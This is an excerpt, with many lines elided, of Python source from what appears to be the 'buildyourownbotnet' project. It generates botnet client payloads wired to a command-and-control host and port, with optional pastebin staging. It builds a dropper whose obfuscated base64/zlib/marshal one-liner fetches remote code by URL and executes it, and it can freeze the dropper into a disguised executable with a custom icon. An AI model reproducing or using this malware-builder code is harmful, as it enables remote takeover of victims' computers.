...
# modules
from buildyourownbotnet.core import util, security, generators
...
def main(*args, **kwargs):
    ...
    if not kwargs:
        ...
        options = collections.namedtuple('Options',
                                         ['host', 'port', 'modules', 'name', 'icon', 'pastebin', 'encrypt', 'compress',
                                          'freeze', 'gui', 'owner', 'operating_system', 'architecture'])(*args,
                                                                                                         **kwargs)
            ...
            if isinstance(m, str):
                ...
                if not os.path.exists(m):
                    ...
                    if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
                        ...
                        continue
                module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join(
        ...
        for line in open(module, 'r').read().splitlines():
            if len(line.split()):
                if line.split()[0] == 'import':
                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in
...
def _payload(options, **kwargs):
    ...
    loader = open('core/loader.py',
                  'r').read()  # , generators.loader(host=C2_HOST, port=int(C2_PORT)+2, packages=list(kwargs['hidden']))))

    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if
                              i not in ['StringIO', '_winreg', 'pycryptonight', 'pyrx', 'ctypes']])
    potential_imports = '''
try:
...
'''
    ...
    modules = '\n'.join(([open(module, 'r').read().partition('# main')[2] for module in kwargs['modules']] + [
        generators.main('Payload', **{"host": C2_HOST, "port": C2_PORT,
                                      "pastebin": options.pastebin if options.pastebin else str(),
                                      "gui": "1" if options.gui else str(),
                                      "owner": options.owner}) + '_payload.run()']))
    ...
    if options.pastebin:
        ...
        s = 'http://{}:{}/{}'.format(C2_HOST, int(C2_PORT) + 1,
...
def _dropper(options, **kwargs):
    ...
    if options.freeze:
        name = 'BotIM_{operating_system}_{architecture}_{var}.py'.format(operating_system=options.operating_system,
                                                                         architecture=options.architecture, var=kwargs[
                'var']) if not options.name else options.name
    else:
        name = 'BotIM_{var}.py'.format(var=kwargs['var'])
...
exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(
        repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(repr(kwargs['url'])), 2)))))
    ...
    if options.freeze:
        ...
        name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'], owner=options.owner,
                                 operating_system=options.operating_system, architecture=options.architecture)
